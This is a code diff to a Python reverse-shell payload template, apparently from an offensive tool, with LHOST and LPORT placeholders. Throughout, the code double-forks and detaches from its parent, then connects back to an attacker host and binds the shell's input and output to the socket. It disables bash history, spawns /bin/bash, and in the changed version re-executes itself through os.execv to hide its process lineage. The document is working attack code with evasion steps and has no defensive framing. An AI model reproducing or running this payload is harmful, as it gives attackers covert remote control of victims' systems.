@@ -6,6 +6,8 @@ VAR LPORT: host port
 '''
 import os, sys
 
+lhost = LHOST
+lport = int(LPORT)
 try:
     # Use double fork + setsid/umask to mask parent process etc...
     if os.fork() == 0:
@@ -16,20 +18,20 @@ try:
         os.setsid()
         os.umask(0)
 
-        import pty
-        import socket
+        cmd = ("import os, pty, socket" + "\n"
+        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)" + "\n"
+        "s.connect(('{}',{}))" + "\n"
+        "os.dup2(s.fileno(),0)" + "\n"
+        "os.dup2(s.fileno(),1)" + "\n"
+        "os.dup2(s.fileno(),2)" + "\n"
+        "os.putenv('HISTFILE','/dev/null')" + "\n"
+        "pty.spawn('/bin/bash')" + "\n"
+        "s.close()" + "\n"
+        "os._exit(0)" + "\n").format(lhost,lport)
 
-        LPORT = int(LPORT)
+        # Completely forget all inherited information from parents.
+        os.execv(sys.executable, [sys.executable, '-c', cmd])
 
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((LHOST,LPORT))
-        os.dup2(s.fileno(),0)
-        os.dup2(s.fileno(),1)
-        os.dup2(s.fileno(),2)
-        os.putenv("HISTFILE",'/dev/null')
-        pty.spawn('/bin/bash')
-        s.close()
-        os._exit(0)
-    sys.stdout.write("[+] Fork successful, going dark.")
+    sys.stdout.write("Fork successful, going dark.")
 except OSError as e:
-    sys.stderr.write("[!] {}".format(e))
+    sys.stderr.write("{}".format(e))
